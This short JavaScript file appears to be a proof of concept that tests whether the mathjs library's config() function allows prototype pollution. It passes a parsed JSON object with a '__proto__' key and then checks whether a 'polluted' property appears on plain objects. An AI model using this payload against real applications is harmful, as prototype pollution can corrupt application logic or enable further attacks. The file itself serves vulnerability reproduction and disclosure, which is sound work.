var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var mathMod = require('mathjs');
const mathjs = mathMod.create(mathMod.all);
console.log({}.polluted);
const newConfig = JSON.parse('{"__proto__":{"polluted":"yes"}}');
mathjs.config(newConfig);
console.log({}.polluted);